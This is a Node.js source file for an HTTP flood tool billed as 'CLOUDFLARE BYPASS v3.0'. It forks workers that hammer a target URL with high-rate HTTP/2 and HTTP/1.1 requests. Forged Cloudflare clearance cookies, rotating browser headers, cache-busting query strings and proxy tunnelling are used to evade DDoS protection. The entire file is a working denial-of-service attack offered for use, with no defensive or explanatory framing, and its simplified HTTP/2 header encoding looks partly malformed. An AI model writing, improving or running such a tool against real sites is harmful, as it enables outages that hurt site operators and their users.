const net = require('net');
const tls = require('tls');
const cluster = require('cluster');
const crypto = require('crypto');
const fs = require('fs');

// Parse arguments
if (process.argv.length < 6) {
    console.log('Usage: node cfvBypass_Enhanced.js <host> <time> <rate> <threads> [proxy.txt]');
    console.log('Example: node cfvBypass_Enhanced.js https://example.com 60 100 4 proxies.txt');
    process.exit(1);
}

const ARGS = {
    target: process.argv[2],
    time: parseInt(process.argv[3]) || 60,
    rate: parseInt(process.argv[4]) || 100,
    threads: parseInt(process.argv[5]) || 4,
    proxyFile: process.argv[6]
};

// Parse target URL
let targetUrl;
let targetHost;
let targetPort = 443;
let targetProtocol = 'https';
try {
    targetUrl = new URL(ARGS.target);
    targetHost = targetUrl.hostname;
    targetProtocol = targetUrl.protocol.replace(':', '');
    if (targetUrl.port) targetPort = parseInt(targetUrl.port);
    else if (targetProtocol === 'http') targetPort = 80;
    else targetPort = 443;
} catch (e) {
    console.error('Invalid target URL');
    process.exit(1);
}

// Load proxies
let PROXIES = [];
if (ARGS.proxyFile) {
    try {
        const content = fs.readFileSync(ARGS.proxyFile, 'utf-8');
        PROXIES = content.split(/\r?\n/)
            .map(line => line.trim())
            .filter(line => line && !line.startsWith('#') && line.includes(':'));
    } catch (e) {
        console.error('Could not read proxy file');
    }
}

let proxyIndex = 0;

// Connection pool for HTTP/2 multiplexing
const connectionPool = {
    direct: [],
    proxies: new Map(),
    maxSize: 50,
    
    getDirect() {
        if (this.direct.length > 0) {
            return this.direct.shift();
        }
        return null;
    },
    
    addDirect(socket) {
        if (this.direct.length < this.maxSize) {
            this.direct.push(socket);
            return true;
        }
        try { socket.destroy(); } catch (e) {}
        return false;
    },
    
    getProxy(proxy) {
        if (this.proxies.has(proxy)) {
            const pool = this.proxies.get(proxy);
            if (pool.length > 0) {
                return pool.shift();
            }
        }
        return null;
    },
    
    addProxy(proxy, socket) {
        if (!this.proxies.has(proxy)) {
            this.proxies.set(proxy, []);
        }
        const pool = this.proxies.get(proxy);
        if (pool.length < this.maxSize) {
            pool.push(socket);
            return true;
        }
        try { socket.destroy(); } catch (e) {}
        return false;
    },
    
    clear() {
        this.direct.forEach(socket => {
            try { socket.destroy(); } catch (e) {}
        });
        this.direct = [];
        this.proxies.forEach(pool => {
            pool.forEach(socket => {
                try { socket.destroy(); } catch (e) {}
            });
        });
        this.proxies.clear();
    }
};

// Utility functions
function rand(arr) {
    return arr[Math.floor(Math.random() * arr.length)];
}

function randomString(len) {
    return crypto.randomBytes(len).toString('hex').substring(0, len);
}

function randomInt(min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}

// Enhanced User Agents
const USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:121.0) Gecko/20100101 Firefox/121.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 OPR/106.0.0.0',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
];

const ACCEPT_LANGUAGES = [
    'en-US,en;q=0.9',
    'en-GB,en-US;q=0.9,en;q=0.8',
    'en-US,en;q=0.9,es;q=0.8',
    'en-US,en;q=0.9,fr;q=0.8',
    'en-CA,en;q=0.9,en-US;q=0.8',
    'en-AU,en;q=0.9,en-US;q=0.8'
];

const ACCEPT_HEADERS = [
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8'
];

const SEC_FETCH_SITE = ['none', 'same-origin', 'cross-site'];
const SEC_FETCH_MODE = ['navigate', 'cors', 'no-cors', 'same-origin'];
const SEC_FETCH_DEST = ['document', 'empty', 'script', 'style', 'image'];
const SEC_FETCH_USER = ['?1', '?0'];

const CACHE_CONTROLS = [
    'max-age=0',
    'no-cache',
    'no-store',
    'must-revalidate'
];

const REFERERS = [
    '',
    `https://www.google.com/`,
    `https://www.bing.com/`,
    `https://${targetHost}/`,
    `https://${targetHost}/page1.html`,
    `https://duckduckgo.com/`
];

const UPGRADE_INSECURE = ['1', '0'];

const TLS_OPTIONS = {
    minVersion: 'TLSv1.2',
    maxVersion: 'TLSv1.3',
    ciphers: [
        'TLS_AES_128_GCM_SHA256',
        'TLS_AES_256_GCM_SHA384',
        'TLS_CHACHA20_POLY1305_SHA256',
        'ECDHE-ECDSA-AES128-GCM-SHA256',
        'ECDHE-RSA-AES128-GCM-SHA256',
        'ECDHE-ECDSA-AES256-GCM-SHA384',
        'ECDHE-RSA-AES256-GCM-SHA384',
        'ECDHE-ECDSA-CHACHA20-POLY1305',
        'ECDHE-RSA-CHACHA20-POLY1305'
    ].join(':'),
    honorCipherOrder: true,
    rejectUnauthorized: false,
    servername: targetHost,
    ALPNProtocols: ['h2', 'http/1.1']
};

function getProxy() {
    if (PROXIES.length === 0) return null;
    return PROXIES[proxyIndex++ % PROXIES.length];
}

function generateCookie() {
    const cookieValue = [
        `_cfuvid=${randomString(32)}`,
        `cf_clearance=${randomString(32)}`,
        `__cf_bm=${randomString(32)}`,
        `session_id=${randomString(24)}`,
        `tracking_id=${randomString(16)}`
    ];
    const numCookies = randomInt(1, 3);
    return cookieValue.slice(0, numCookies).join('; ');
}

// HTTP/2 Pseudo-headers and frame generation
function generateHTTP2Headers(path) {
    const headers = {
        ':method': 'GET',
        ':path': path,
        ':scheme': targetProtocol,
        ':authority': targetHost,
        'user-agent': rand(USER_AGENTS),
        'accept': rand(ACCEPT_HEADERS),
        'accept-language': rand(ACCEPT_LANGUAGES),
        'accept-encoding': 'gzip, deflate, br',
        'cookie': generateCookie(),
        'sec-fetch-dest': rand(SEC_FETCH_DEST),
        'sec-fetch-mode': rand(SEC_FETCH_MODE),
        'sec-fetch-site': rand(SEC_FETCH_SITE),
        'sec-fetch-user': rand(SEC_FETCH_USER),
        'upgrade-insecure-requests': rand(UPGRADE_INSECURE),
        'cache-control': rand(CACHE_CONTROLS)
    };
    
    const referer = rand(REFERERS);
    if (referer) {
        headers['referer'] = referer;
    }
    
    if (Math.random() > 0.5) {
        headers['dnt'] = '1';
    }
    
    if (Math.random() > 0.7) {
        headers['sec-ch-ua'] = '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"';
        headers['sec-ch-ua-mobile'] = '?0';
        headers['sec-ch-ua-platform'] = '"Windows"';
    }
    
    return headers;
}

// HTTP/2 SETTINGS frame
function generateSettingsFrame() {
    const settings = Buffer.alloc(9);
    settings.writeUInt8(0x0, 0); // No ACK
    settings.writeUInt16BE(0x4, 1); // Length
    settings.writeUInt8(0x4, 3); // Type: SETTINGS
    settings.writeUInt8(0x0, 4); // Flags
    settings.writeUInt32BE(0x0, 5); // Stream Identifier
    
    // Settings payload
    const payload = Buffer.alloc(6);
    payload.writeUInt16BE(0x4, 0); // Header Table Size
    payload.writeUInt32BE(65536, 2); // Value
    
    return Buffer.concat([settings, payload]);
}

// HTTP/2 HEADERS frame
function generateHeadersFrame(streamId, headers) {
    // Simplified HPACK encoding for headers
    let headerBlock = '';
    
    // Encode :method, :path, :scheme, :authority (indexed)
    headerBlock += String.fromCharCode(0x82); // :method GET
    headerBlock += String.fromCharCode(0x83); // :path / (simplified)
    headerBlock += String.fromCharCode(0x85); // :scheme https
    headerBlock += String.fromCharCode(0x86); // :authority
    
    // Encode other headers (literal)
    Object.keys(headers).forEach(key => {
        if (!key.startsWith(':')) {
            const value = headers[key];
            const nameLen = key.length;
            const valLen = value.length;
            
            // Literal header with new name
            headerBlock += String.fromCharCode(0x40); // Literal header never indexed
            headerBlock += String.fromCharCode(nameLen);
            headerBlock += key;
            headerBlock += String.fromCharCode(valLen);
            headerBlock += value;
        }
    });
    
    const headerBuffer = Buffer.from(headerBlock, 'latin1');
    
    const frame = Buffer.alloc(9 + headerBuffer.length);
    frame.writeUInt32BE(headerBuffer.length, 0); // Length
    frame.writeUInt8(0x1, 3); // Type: HEADERS
    frame.writeUInt8(0x4 | 0x1, 4); // Flags: END_HEADERS | END_STREAM
    frame.writeUInt32BE(streamId, 5); // Stream Identifier
    
    headerBuffer.copy(frame, 9);
    
    return frame;
}

// HTTP/2 request generation
function generateHTTP2Request(streamId) {
    const path = targetUrl.pathname || '/';
    const paths = [
        path,
        `${path}?${randomString(6)}=${randomString(6)}`,
        `${path}?q=${randomString(8)}&t=${Date.now()}`,
        `${path}?ref=${randomString(6)}&id=${randomInt(1000, 9999)}`,
        `${path}?search=${randomString(10)}&page=${randomInt(1, 10)}`,
        `${path}?category=${randomString(6)}&sort=${randomString(5)}`,
        `${path}?v=${randomInt(100000, 999999)}`,
        `${path}?callback=${randomString(8)}`
    ];
    const randomPath = rand(paths);
    
    const headers = generateHTTP2Headers(randomPath);
    return generateHeadersFrame(streamId, headers);
}

// HTTP/1.1 request generation (fallback)
function generateHTTP11Request() {
    const userAgent = rand(USER_AGENTS);
    const acceptLang = rand(ACCEPT_LANGUAGES);
    const acceptHeader = rand(ACCEPT_HEADERS);
    const secFetchSite = rand(SEC_FETCH_SITE);
    const secFetchMode = rand(SEC_FETCH_MODE);
    const secFetchDest = rand(SEC_FETCH_DEST);
    const secFetchUser = rand(SEC_FETCH_USER);
    const cacheControl = rand(CACHE_CONTROLS);
    const referer = rand(REFERERS);
    const upgradeInsecure = rand(UPGRADE_INSECURE);
    const cookie = generateCookie();
    
    const path = targetUrl.pathname || '/';
    const paths = [
        path,
        `${path}?${randomString(6)}=${randomString(6)}`,
        `${path}?q=${randomString(8)}&t=${Date.now()}`,
        `${path}?ref=${randomString(6)}&id=${randomInt(1000, 9999)}`,
        `${path}?search=${randomString(10)}&page=${randomInt(1, 10)}`,
        `${path}?category=${randomString(6)}&sort=${randomString(5)}`,
        `${path}?v=${randomInt(100000, 999999)}`,
        `${path}?callback=${randomString(8)}`
    ];
    const randomPath = rand(paths);
    
    let request = `GET ${randomPath} HTTP/1.1\r\n`;
    request += `Host: ${targetHost}\r\n`;
    request += `User-Agent: ${userAgent}\r\n`;
    request += `Accept: ${acceptHeader}\r\n`;
    request += `Accept-Language: ${acceptLang}\r\n`;
    request += `Accept-Encoding: gzip, deflate, br\r\n`;
    request += `Connection: keep-alive\r\n`;
    request += `Upgrade-Insecure-Requests: ${upgradeInsecure}\r\n`;
    
    if (referer) {
        request += `Referer: ${referer}\r\n`;
    }
    
    request += `Sec-Fetch-Dest: ${secFetchDest}\r\n`;
    request += `Sec-Fetch-Mode: ${secFetchMode}\r\n`;
    request += `Sec-Fetch-Site: ${secFetchSite}\r\n`;
    request += `Sec-Fetch-User: ${secFetchUser}\r\n`;
    
    request += `Cache-Control: ${cacheControl}\r\n`;
    request += `Pragma: no-cache\r\n`;
    request += `Cookie: ${cookie}\r\n`;
    
    if (Math.random() > 0.5) {
        request += `DNT: 1\r\n`;
    }
    
    if (Math.random() > 0.7) {
        request += `Sec-Ch-Ua: "Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"\r\n`;
        request += `Sec-Ch-Ua-Mobile: ?0\r\n`;
        request += `Sec-Ch-Ua-Platform: "Windows"\r\n`;
    }
    
    request += `\r\n`;
    
    return request;
}

// Stream counter for HTTP/2
let streamIdCounter = 1;

// Send HTTP/2 request through connection
function sendHTTP2Request(socket, isProxy = false) {
    try {
        const streamId = streamIdCounter;
        streamIdCounter += 2;
        
        if (streamId > 2147483647) {
            streamIdCounter = 1;
        }
        
        const frame = generateHTTP2Request(streamId);
        socket.write(frame);
        
        if (process.send) {
            process.send({ type: 'request' });
        }
        
        return true;
    } catch (e) {
        return false;
    }
}

// Direct HTTP/2 attack
function attackDirectHTTP2() {
    let socket = connectionPool.getDirect();
    
    if (socket && !socket.destroyed) {
        // Reuse existing connection
        for (let i = 0; i < 5; i++) {
            if (!sendHTTP2Request(socket)) break;
        }
        return;
    }
    
    // Create new connection
    const newSocket = new net.Socket();
    newSocket.setTimeout(3000);
    newSocket.setNoDelay(true);
    
    const cleanup = () => {
        try { newSocket.destroy(); } catch (e) {}
    };
    
    newSocket.connect(targetPort, targetHost, () => {
        try {
            const tlsSocket = tls.connect({
                socket: newSocket,
                ...TLS_OPTIONS
            }, () => {
                // Send HTTP/2 preface
                const preface = 'PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n';
                tlsSocket.write(preface);
                
                // Send SETTINGS frame
                const settingsFrame = generateSettingsFrame();
                tlsSocket.write(settingsFrame);
                
                // Add to pool
                if (!connectionPool.addDirect(tlsSocket)) {
                    cleanup();
                    return;
                }
                
                // Send multiple requests
                for (let i = 0; i < 5; i++) {
                    if (!sendHTTP2Request(tlsSocket)) break;
                }
            });
            
            tlsSocket.on('error', cleanup);
            tlsSocket.on('timeout', cleanup);
            tlsSocket.on('close', () => {
                // Remove from pool when closed
                const index = connectionPool.direct.indexOf(tlsSocket);
                if (index > -1) {
                    connectionPool.direct.splice(index, 1);
                }
            });
        } catch (e) {
            cleanup();
        }
    });
    
    newSocket.on('error', cleanup);
    newSocket.on('timeout', cleanup);
}

// Proxy HTTP/2 attack
function attackProxyHTTP2() {
    const proxy = getProxy();
    if (!proxy) {
        attackDirectHTTP2();
        return;
    }
    
    let socket = connectionPool.getProxy(proxy);
    
    if (socket && !socket.destroyed) {
        // Reuse existing connection
        for (let i = 0; i < 3; i++) {
            if (!sendHTTP2Request(socket)) break;
        }
        return;
    }
    
    // Create new connection
    const [proxyHost, proxyPort] = proxy.split(':');
    const newSocket = new net.Socket();
    newSocket.setTimeout(5000);
    newSocket.setNoDelay(true);
    
    const cleanup = () => {
        try { newSocket.destroy(); } catch (e) {}
    };
    
    newSocket.connect(parseInt(proxyPort), proxyHost, () => {
        try {
            const connect = `CONNECT ${targetHost}:${targetPort} HTTP/1.1\r\nHost: ${targetHost}\r\nUser-Agent: ${rand(USER_AGENTS)}\r\n\r\n`;
            newSocket.write(connect);
        } catch (e) {
            cleanup();
        }
    });
    
    let buffer = '';
    newSocket.on('data', (data) => {
        buffer += data.toString();
        if (buffer.includes('\r\n\r\n')) {
            if (buffer.includes('200') && !buffer.includes('407')) {
                try {
                    const tlsSocket = tls.connect({
                        socket: newSocket,
                        ...TLS_OPTIONS
                    }, () => {
                        // Send HTTP/2 preface
                        const preface = 'PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n';
                        tlsSocket.write(preface);
                        
                        // Send SETTINGS frame
                        const settingsFrame = generateSettingsFrame();
                        tlsSocket.write(settingsFrame);
                        
                        // Add to pool
                        if (!connectionPool.addProxy(proxy, tlsSocket)) {
                            cleanup();
                            return;
                        }
                        
                        // Send multiple requests
                        for (let i = 0; i < 3; i++) {
                            if (!sendHTTP2Request(tlsSocket)) break;
                        }
                    });
                    
                    tlsSocket.on('error', cleanup);
                    tlsSocket.on('timeout', cleanup);
                    tlsSocket.on('close', () => {
                        // Remove from pool when closed
                        if (connectionPool.proxies.has(proxy)) {
                            const pool = connectionPool.proxies.get(proxy);
                            const index = pool.indexOf(tlsSocket);
                            if (index > -1) {
                                pool.splice(index, 1);
                            }
                        }
                    });
                } catch (e) {
                    cleanup();
                }
            } else {
                cleanup();
            }
        }
    });
    
    newSocket.on('error', cleanup);
    newSocket.on('timeout', cleanup);
}

// Fallback to HTTP/1.1
function attackHTTP11() {
    const socket = new net.Socket();
    socket.setTimeout(2000);
    socket.setNoDelay(true);
    
    const cleanup = () => {
        try { socket.destroy(); } catch (e) {}
    };
    
    socket.connect(targetPort, targetHost, () => {
        try {
            if (targetProtocol === 'https') {
                const tlsSocket = tls.connect({
                    socket: socket,
                    ...TLS_OPTIONS
                }, () => {
                    try {
                        tlsSocket.write(generateHTTP11Request());
                        if (process.send) {
                            process.send({ type: 'request' });
                        }
                    } catch (e) {
                        cleanup();
                    }
                });
                
                tlsSocket.on('error', cleanup);
                tlsSocket.on('timeout', cleanup);
            } else {
                socket.write(generateHTTP11Request());
                if (process.send) {
                    process.send({ type: 'request' });
                }
            }
        } catch (e) {
            cleanup();
        }
    });
    
    socket.on('error', cleanup);
    socket.on('timeout', cleanup);
}

// Master process
if (cluster.isMaster) {
    console.log(`
╔════════════════════════════════════════════════════════════════╗
║      CLOUDFLARE BYPASS v3.0 - HTTP/2 + HIGH RPS MODE          ║
╚════════════════════════════════════════════════════════════════╝
Target: ${targetHost}:${targetPort} (${targetProtocol})
Threads: ${ARGS.threads}
Duration: ${ARGS.time}s
Target RPS: ${ARGS.rate} req/sec
Proxies: ${PROXIES.length || 'None'}
Mode: HTTP/2 with Multiplexing
╔════════════════════════════════════════════════════════════════╗
`);
    
    for (let i = 0; i < ARGS.threads; i++) {
        cluster.fork();
    }
    
    let totalReqs = 0;
    let startTime = Date.now();
    let lastTime = startTime;
    let lastCount = 0;
    
    const statsInterval = setInterval(() => {
        const now = Date.now();
        const elapsed = (now - startTime) / 1000;
        const avgRps = elapsed > 0 ? Math.round(totalReqs / elapsed) : 0;
        
        const delta = (now - lastTime) / 1000;
        const curRps = delta > 0 ? Math.round((totalReqs - lastCount) / delta) : 0;
        
        const bypassRate = totalReqs > 0 ? Math.min(((curRps / ARGS.rate) * 100), 100).toFixed(1) : '0.0';
        
        console.log(`[+] Requests: ${totalReqs} | RPS: ${curRps} | Avg: ${avgRps} | Bypass Rate: ${bypassRate}% | Workers: ${Object.keys(cluster.workers || {}).length}`);
        
        lastTime = now;
        lastCount = totalReqs;
    }, 1000);
    
    cluster.on('message', (worker, msg) => {
        if (msg && msg.type === 'request') {
            totalReqs++;
        }
    });
    
    cluster.on('exit', (worker) => {
        if (!worker.exitedAfterDisconnect) {
            cluster.fork();
        }
    });
    
    setTimeout(() => {
        clearInterval(statsInterval);
        console.log('\n[+] Attack completed');
        console.log(`[+] Total Requests: ${totalReqs}`);
        
        connectionPool.clear();
        Object.values(cluster.workers || {}).forEach(w => w.disconnect());
        setTimeout(() => process.exit(0), 500);
    }, ARGS.time * 1000);
    
} else {
    const useProxy = PROXIES.length > 0;
    let http2Attempts = 0;
    let http11Attempts = 0;
    
    const attackLoop = () => {
        const useHTTP2 = Math.random() > 0.3; // 70% HTTP/2, 30% HTTP/1.1
        
        if (useHTTP2) {
            // Use HTTP/2 with multiplexing
            const requestsPerIteration = Math.max(5, Math.floor(ARGS.rate / 10));
            
            for (let i = 0; i < requestsPerIteration; i++) {
                if (useProxy) {
                    attackProxyHTTP2();
                } else {
                    attackDirectHTTP2();
                }
            }
            http2Attempts += requestsPerIteration;
        } else {
            // Fallback to HTTP/1.1
            const requestsPerIteration = Math.max(3, Math.floor(ARGS.rate / 20));
            
            for (let i = 0; i < requestsPerIteration; i++) {
                attackHTTP11();
            }
            http11Attempts += requestsPerIteration;
        }
        
        // Minimal delay for maximum RPS
        setImmediate(attackLoop);
    };
    
    // Periodic cleanup
    setInterval(() => {
        if (connectionPool.direct.length > connectionPool.maxSize) {
            connectionPool.direct = connectionPool.direct.slice(-connectionPool.maxSize);
        }
        
        connectionPool.proxies.forEach((pool, proxy) => {
            if (pool.length > connectionPool.maxSize) {
                connectionPool.proxies.set(proxy, pool.slice(-connectionPool.maxSize));
            }
        });
    }, 5000);
    
    attackLoop();
    
    process.on('disconnect', () => {
        connectionPool.clear();
        process.exit(0);
    });
    process.on('uncaughtException', () => {});
    process.on('unhandledRejection', () => {});
}

process.on('SIGINT', () => {
    console.log('\n[!] Stopping...');
    connectionPool.clear();
    process.exit(0);
});